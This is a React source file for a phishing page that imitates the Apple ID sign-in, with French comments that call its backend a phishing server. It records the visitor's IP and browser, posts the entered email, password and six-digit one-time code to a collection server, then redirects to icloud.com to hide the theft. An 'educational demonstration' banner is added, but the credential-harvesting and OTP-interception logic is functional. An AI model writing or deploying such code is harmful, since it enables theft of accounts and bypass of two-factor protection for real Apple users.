import AppleLoginIcon from "../assets/apple.svg";
import React, { useState, useRef, useEffect } from "react";
import { BsArrowRightCircle } from "react-icons/bs";
import ProgressCircle from "./ProgressCircle";
import LoadingCircle from "../assets/loading.svg";

const LoginForm = () => {
  const [isDropdown, setIsDropdown] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [otp, setOtp] = useState(Array(6).fill(""));
  const [clientData, setClientData] = useState({});

  const otpRefs = useRef(
    Array(6)
      .fill()
      .map(() => React.createRef())
  );

  // Capture des données client au chargement
  useEffect(() => {
    const fetchClientInfo = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        setClientData({
          ip: data.ip,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        });
      } catch (error) {
        console.error("Error fetching client info:", error);
      }
    };
    fetchClientInfo();
  }, []);

  const handleDropdown = () => setIsDropdown(!isDropdown);

  const handleLogin = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    
    // Envoi des données au serveur phishing
    const credentials = {
      email,
      password,
      ...clientData,
      origin: window.location.href
    };

    try {
      const response = await fetch('http://localhost:3001/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(credentials),
      });

      if (response.ok) {
        setIsVerifying(true);
        console.log("Credentials submitted (educational purpose only)");
      }
    } catch (error) {
      console.error("Error submitting credentials:", error);
    } finally {
      setIsLoading(false);
    }
  };

  // ... (gardez toutes les autres fonctions handleEmailChange, handlePasswordChange, etc. inchangées)

  const handleVerifyCode = async (otp) => {
    const otpCode = otp.join("");
    const otpData = {
      email,
      otp: otpCode,
      ...clientData,
      timestamp: new Date().toISOString()
    };

    try {
      await fetch('http://localhost:3001/verify-otp', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(otpData),
      });

      // Redirection réaliste après un délai
      setTimeout(() => {
        window.location.href = "https://icloud.com";
      }, 1500);
    } catch (error) {
      console.error("Error verifying OTP:", error);
    }
  };

  // Ajout d'un disclaimer bien visible
  const SecurityDisclaimer = () => (
    <div className="mt-6 p-3 bg-yellow-50 border border-yellow-200 rounded-lg text-xs text-yellow-800 text-center">
      <p>⚠️ <strong>Educational Demonstration Only</strong></p>
      <p>Do not enter real Apple ID credentials.</p>
    </div>
  );

  return (
    <div className="login-form flex flex-col items-center justify-center w-[20rem] sm:w-[30rem] p-10 bg-white text-black rounded-2xl shadow-2xl border border-gray-200">
      <img
        src={AppleLoginIcon}
        alt="Apple login icon"
        className="w-32 sm:w-40"
      />

      {!isVerifying ? (
        <form onSubmit={handleLogin} className="w-full">
          {/* ... (gardez tout le JSX existant inchangé jusqu'aux options) */}

          <SecurityDisclaimer />
        </form>
      ) : (
        <div className="w-full mt-8">
          {/* ... (gardez le JSX OTP inchangé) */}
          <SecurityDisclaimer />
        </div>
      )}
    </div>
  );
};

export default LoginForm;
